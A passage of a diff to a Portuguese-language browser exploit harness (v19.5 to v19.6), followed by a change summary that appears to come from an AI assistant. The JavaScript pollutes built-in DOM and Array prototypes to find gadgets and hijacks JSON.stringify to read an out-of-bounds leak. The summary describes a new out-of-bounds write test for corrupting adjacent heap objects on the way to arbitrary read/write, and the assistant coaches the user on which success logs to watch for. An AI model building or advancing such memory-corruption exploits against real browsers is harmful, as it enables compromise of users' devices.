(obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') }, { name: 'onload', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onload === v ? 'PP afetou handler `onload`!' : null, createTarget: () => document.createElement('img') }, { name: 'appendChild', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.appendChild(document.createElement('span')); return null; } catch(e){ return `Node.appendChild quebrou! ${e.message}`;} } }, { name: 'addEventListener', proto: EventTarget.prototype, protoName: 'EventTarget', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.addEventListener('test', ()=>{}); return null; } catch(e){ return `EventTarget.addEventListener quebrou! ${e.message}`;} } }, { name: 'value', proto: HTMLInputElement.prototype, protoName: 'HTMLInputElement', createTarget: () => document.createElement('input'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou input.value!' : null }, { name: 'value', proto: HTMLTextAreaElement.prototype, protoName: 'HTMLTextAreaElement', createTarget: () => document.createElement('textarea'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou textarea.value!' : null }, { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].map(()=>{}); return null;} catch(e){ return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'filter', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].filter(()=>{}); return null;} catch(e){ return `Array.filter quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'forEach', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].forEach(()=>{}); return null;} catch(e){ return `Array.forEach quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'join', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[1,2].join(); return null;} catch(e){ return `Array.join quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'call', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.call(); return null;} catch(e){ return `Function.call quebrou! ${e.message}`;} }, createTarget: () => function(){} }, { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.apply(); return null;} catch(e){ return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} }, ];
             const testValue = "PP_Adv_Polluted_" + Date.now();
             let successCount = 0; let gadgetCount = 0; let gadgetMessages = [];
             for (const item of propsToPollute) { if (!item.proto) { continue; } const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName; let inherited = false; let gadgetMsg = null; let errorMsg = null; let originalValue = undefined; let wasDefined = false; try { wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop); if (wasDefined) { originalValue = targetProto[prop]; } } catch (e) { log(`AVISO: Erro check/get original ${targetProtoName}.${prop}: ${e.message}`, 'warn', FNAME); continue; } try { targetProto[prop] = testValue; let obj; if (item.createTarget) { try { obj = item.createTarget(); } catch (e) { obj = {}; } } else { obj = {}; } let inheritedValue = undefined; try { inheritedValue = obj[prop]; } catch (e) {} if (inheritedValue === testValue) { log(`-> VULN: Herança PP para '${targetProtoName}.${prop}' OK.`, 'vuln', FNAME); inherited = true; successCount++; if (item.gadgetCheck) { try { gadgetMsg = item.gadgetCheck(obj, testValue); } catch(e){} if (gadgetMsg) { log(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME); gadgetMessages.push(prop + ": " + gadgetMsg); gadgetCount++; if (['innerHTML', 'outerHTML', 'src', 'href', 'onclick', 'onerror', 'onload', 'value', 'postMessage', 'send', 'call', 'apply', 'map', 'filter', 'forEach', 'appendChild', 'addEventListener', 'hasOwnProperty', 'join'].includes(prop)) { log(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME); } } } } else { if (prop === '__proto__') { log(`-> FAIL: Herança de '__proto__' não OK (Esperado).`, 'good', FNAME); } } } catch (e) { log(`Erro ao poluir/testar '${targetProtoName}.${prop}': ${e.message}`, 'error', FNAME); errorMsg = e.message; } finally { try { let cleanupOK = true; if (wasDefined) { targetProto[prop] = originalValue; try { if (targetProto[prop] !== originalValue) cleanupOK = false; } catch(e){ cleanupOK = false; } } else { delete targetProto[prop]; if (Object.prototype.hasOwnProperty.call(targetProto, prop)) cleanupOK = false; } if (!cleanupOK) { log(`---> CRITICAL: FALHA ao limpar/restaurar ${targetProtoName}.${prop}! Estado pode estar inconsistente. <---`, 'critical', FNAME); } } catch (e) { log(`AVISO CRÍTICO: Erro INESPERADO ao limpar/restaurar ${targetProtoName}.${prop}: ${e.message}`, 'critical', FNAME); } } await PAUSE(15); }
-            log(`--- Teste 4 Concluído (${successCount} OK, ${gadgetCount} gadgets encontrados) ---`, 'test', FNAME);
+            log(`--- Teste 2 Concluído (${successCount} OK, ${gadgetCount} gadgets encontrados) ---`, 'test', FNAME);
             if (gadgetCount > 0) { log(`Gadgets detectados: ${gadgetMessages.join('; ')}`, 'critical', FNAME); }
             await PAUSE();
         };
 
-        // 5. Teste de Interação (Hijack + OOB - Inalterado v19.3)
+        // Teste 3: PP Hijack (mantido para verificar interação, mesmo sem leak útil)
         const testPPJsonHijackInteraction = async () => {
             const FNAME = 'testPPJsonHijackInteraction';
-            log("--- Iniciando Teste 5: PP Hijack (JSON.stringify) + OOB Interaction ---", 'test', FNAME);
+            log("--- Iniciando Teste 3: PP Hijack (JSON.stringify) + OOB Interaction ---", 'test', FNAME);
             const orig = JSON.stringify; let okH = false; let okL = false; let okR = false;
-            try { JSON.stringify = function hijacked(v, r, s) { log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln', FNAME); okH = true; try { const l = leakedValueFromOOB; let lStr = "NULO ou Indefinido"; let lHex = ""; if (l) { lHex = ` (H=${toHex(l.high)}, L=${toHex(l.low)})`; lStr = l.type === 'U64' ? `U64 H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}` : l.type === 'F64_SPRAY' ? `F64_SPRAY H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}` : l.type === 'U32_WASM?' ? `U32_WASM? ${toHex(l.low)} @${l.offset}` : l.type === 'U64_WASM?' ? `U64_WASM? H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}` : `U32 ${toHex(l.low)} @${l.offset}`; okL = true; log(` ---> INFO: Interação Hijack + OOB Read Leak OK.`, 'escalation', FNAME); } log(` -> Valor OOB lido via Hijack: ${lStr}${lHex}`, okL ? 'leak' : 'warn', FNAME); } catch(ie) { log(` -> Erro ao tentar ler leak OOB via Hijack: ${ie.message}`, 'error', FNAME); console.error(ie); } const hijackReturnValue = '{"hijacked": true, "leak_read_success": ' + okL + '}'; return hijackReturnValue; }; await PAUSE(); const testObject = {a:1, b: 'test'}; const result = JSON.stringify(testObject); if (result && result.includes('"hijacked": true')) { log("VULN: Retorno da função JSON.stringify sequestrada verificado!", 'vuln', FNAME); okR = true; } else if (okH) { log("AVISO: JSON.stringify sequestrado, mas retorno inesperado.", 'warn', FNAME); } else { log("JSON.stringify não foi sequestrado.", 'good', FNAME); } } catch (e) { log(`Erro fatal durante Teste 5: ${e.message}`, 'error', FNAME); console.error(e); } finally { const currentStringify = JSON.stringify; JSON.stringify = orig; if (currentStringify !== orig && JSON.stringify !== orig) { log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'critical', FNAME); } else if (okH) { log("JSON.stringify restaurado.", 'good', 'Cleanup');} }
-            log(`--- Teste 5 Concluído (Hijack: ${okH}, Retorno: ${okR}, Leitura Leak: ${okL}) ---`, 'test', FNAME);
+            try { JSON.stringify = function hijacked(v, r, s) { log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln', FNAME); okH = true; try { const l = leakedValueFromOOB; let lStr = "NULO ou Indefinido"; let lHex = ""; if (l) { lHex = ` (H=${toHex(l.high)}, L=${toHex(l.low)})`; lStr = l.type === 'U64' ? `U64 H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}` : l.type === 'F64_SPRAY' ? `F64_SPRAY H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}` : l.type === 'U32_WASM?' ? `U32_WASM? ${toHex(l.low)} @${l.offset}` : l.type === 'U64_WASM?' ? `U64_WASM? H=${toHex(l.high)} L=${toHex(l.low)} @${l.offset}` : `U32 ${toHex(l.low)} @${l.offset}`; okL = true; log(` ---> INFO: Interação Hijack + OOB Read Leak OK (Tecnicamente).`, 'info', FNAME); } log(` -> Valor OOB lido via Hijack: ${lStr}${lHex}`, okL ? 'leak' : 'warn', FNAME); } catch(ie) { log(` -> Erro ao tentar ler leak OOB via Hijack: ${ie.message}`, 'error', FNAME); console.error(ie); } const hijackReturnValue = '{"hijacked": true, "leak_read_success": ' + okL + '}'; return hijackReturnValue; }; await PAUSE(); const testObject = {a:1, b: 'test'}; const result = JSON.stringify(testObject); if (result && result.includes('"hijacked": true')) { log("VULN: Retorno da função JSON.stringify sequestrada verificado!", 'vuln', FNAME); okR = true; } else if (okH) { log("AVISO: JSON.stringify sequestrado, mas retorno inesperado.", 'warn', FNAME); } else { log("JSON.stringify não foi sequestrado.", 'good', FNAME); } } catch (e) { log(`Erro fatal durante Teste 3: ${e.message}`, 'error', FNAME); console.error(e); } finally { const currentStringify = JSON.stringify; JSON.stringify = orig; if (currentStringify !== orig && JSON.stringify !== orig) { log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'critical', FNAME); } else if (okH) { log("JSON.stringify restaurado.", 'good', 'Cleanup');} }
+            log(`--- Teste 3 Concluído (Hijack: ${okH}, Retorno: ${okR}, Leitura Leak: ${okL}) ---`, 'test', FNAME);
             return okR && okL;
         };
 
-        // --- Função Principal de Execução (v19.5) ---
+
+        // --- Função Principal de Execução (v19.6) ---
         const runExploitFocusedTests = async () => {
             const FNAME = 'runExploitFocusedTests';
             if (runBtn) runBtn.disabled = true; findings = [];
             const summaryDiv = document.getElementById('summary');
             if (summaryDiv) summaryDiv.innerHTML = ''; if (outputDiv) outputDiv.innerHTML = '';
-            log("==== INICIANDO TESTES FOCADOS EM EXPLOIT (v19.5) ====", 'test', FNAME);
+            log("==== INICIANDO TESTES FOCADOS EM EXPLOIT (v19.6) ====", 'test', FNAME);
 
-            await testOOBReadInfoLeak(); // Teste 1: Leak com Spray Misto
+            await testAdjacentCorruption(); // Teste 1: OOB Write Adjacente
             await PAUSE(MEDIUM_PAUSE);
 
-            // Removido testWasmMemoryLeak
-
-            await testOOBWriteMetadata(); // Teste 2: Corrupção de Metadata
+            await testAdvancedPP(); // Teste 2: PP Avançada
             await PAUSE(MEDIUM_PAUSE);
 
-            await testArbitraryRW(); // Teste 3: Tentativa de R/W Arbitrário
+            await testPPJsonHijackInteraction(); // Teste 3: Interação Hijack
             await PAUSE(MEDIUM_PAUSE);
 
-            await testAdvancedPP(); // Teste 4: PP Avançada
-            await PAUSE(MEDIUM_PAUSE);
-
-            await testPPJsonHijackInteraction(); // Teste 5: Interação Hijack + Leak
-            await PAUSE(MEDIUM_PAUSE);
+            // Removidos testes de leak/metadata/arbitrary R/W que não funcionaram
 
             log("\n==== GERANDO SUMÁRIO FINAL ====", 'test', FNAME);
             if (summaryDiv) {
                 summaryDiv.innerHTML = '<h2>Sumário Testes Focados (Findings Críticos)</h2>';
                 if (findings.length === 0) { summaryDiv.innerHTML += '<p style="color:#4CAF50;">Nenhum finding crítico/relevante (vuln, critical, escalation, ptr, leak) registrado.</p>'; } else { summaryDiv.innerHTML += `<p style="color:#FFC107;">${findings.length} finding(s) crítico(s)/relevante(s) registrado(s):</p><ul>`; findings.sort((a, b) => { const order = { 'escalation': 1, 'critical': 2, 'vuln': 3, 'ptr': 4, 'leak': 5 }; return (order[a.type] || 99) - (order[b.type] || 99); }); findings.forEach(f => { const itemClass = f.type === 'critical' ? 'log-critical' : f.type === 'escalation' ? 'log-escalation' : f.type === 'ptr' ? 'log-ptr' : f.type === 'leak' ? 'log-leak' : 'log-vuln'; const cleanMessage = f.message.replace(/</g, "&lt;").replace(/>/g, "&gt;"); summaryDiv.innerHTML += `<li class="${itemClass}">${f.time} [${f.funcName}] ${cleanMessage}</li>`; }); summaryDiv.innerHTML += '</ul>'; }
             }
-            log("\n==== TESTES FOCADOS CONCLUÍDOS (v19.5) ====", 'test', FNAME);
+            log("\n==== TESTES FOCADOS CONCLUÍDOS (v19.6) ====", 'test', FNAME);
             if (runBtn) runBtn.disabled = false;
         };
     </script>
@@ -330,19 +275,24 @@
 </html>
 ```
 
-**Resumo das Mudanças (v19.5):**
+**Resumo das Mudanças (v19.6):**
 
-1.  **`testOOBReadInfoLeak` (Teste 1):**
-    * Spray aumentado para 500 elementos (250 objetos `{marker, data}` + 250 `Float64Array`).
-    * Faixa de leitura OOB aumentada para `[-192, bufferSize + 192)`.
-    * Lógica de análise da leitura OOB refinada para procurar marcadores de objeto, valores double do spray, ponteiros ou qualquer outro dado não padrão.
-2.  **`testOOBWriteMetadata` (Teste 2):**
-    * Spray dos `ArrayBuffer`s alvo aumentado para 200.
-3.  **`testArbitraryRW` (Teste 3):** Sem alterações, depende do Teste 2.
-4.  **`testWasmMemoryLeak`:** Removido.
-5.  **`testAdvancedPP` (Teste 4):** Sem alterações.
-6.  **`testPPJsonHijackInteraction` (Teste 5):** Sem alterações funcionais (apenas ordem).
-7.  **Ordem e Numeração:** A ordem dos testes foi ajustada e a numeração nos logs e títulos foi atualizada.
-8.  **Versionamento:** Atualizado para v19.5.
+1.  **Novo Teste: `testAdjacentCorruption` (Teste 1):**
+    * Tenta alocar um buffer de controle seguido por um `ArrayBuffer`, um `Float64Array` e um objeto simples.
+    * Realiza escritas OOB (32 e 64 bits) a partir do buffer de controle em vários offsets.
+    * Após cada escrita OOB *potencial*, verifica se os dados ou metadados dos objetos adjacentes foram alterados (ex: `targetArrayBuffer.byteLength`, `targetObject.value`, `targetFloatArray[0]`).
+    * Loga `VULN`/`CRITICAL` se detectar corrupção.
+    * Repete o processo algumas vezes para variar o layout da memória.
+2.  **Testes Removidos:** `testOOBReadInfoLeak`, `testWasmMemoryLeak`, `testOOBWriteMetadata`, `testArbitraryRW` foram removidos, pois não estavam produzindo resultados úteis e complicavam o script.
+3.  **Testes Mantidos:** `testAdvancedPP` (Teste 2) e `testPPJsonHijackInteraction` (Teste 3) foram mantidos. O teste de hijack agora não terá um leak útil para ler, mas ainda confirma a capacidade de sequestro.
+4.  **Ordem e Numeração:** Atualizada para a nova sequência de 3 testes.
+5.  **Versionamento:** Atualizado para v19.6.
 
-Execute esta versão. O foco principal é o **Teste 1 (`testOOBReadInfoLeak`)**. Observe atentamente se algum valor útil é logado como `VALOR U64 ARMAZENADO` ou `VALOR U32 ARMAZENADO`, ou se aparecem logs `Spray Double?` ou `Spray Object Marker?`. O segundo ponto chave é o **Teste 2 (`testOOBWriteMetadata`)**: verifique se ele finalmente reporta `SUCESSO! byteLength corrompido...`. Se sim, o **Teste 3 (`testArbitraryRW`)** tentará usar essa primiti
+Execute esta versão. O foco é totalmente no **Teste 1 (`testAdjacentCorruption`)**. Procure por logs como:
+
+* `VULN: targetArrayBuffer.byteLength CORROMPIDO...`
+* `VULN: targetObject.value CORROMPIDO...`
+* `VULN: targetFloatArray[0] CORROMPIDO...`
+* `SUCESSO: Escrita OOB conseguiu corromper dados/metadados de objeto adjacente!`
+
+Se algum desses aparecer, significa que a escrita OOB simples, mesmo sem um info leak prévio, conseguiu ter um efeito observável e potencialmente controlável no he
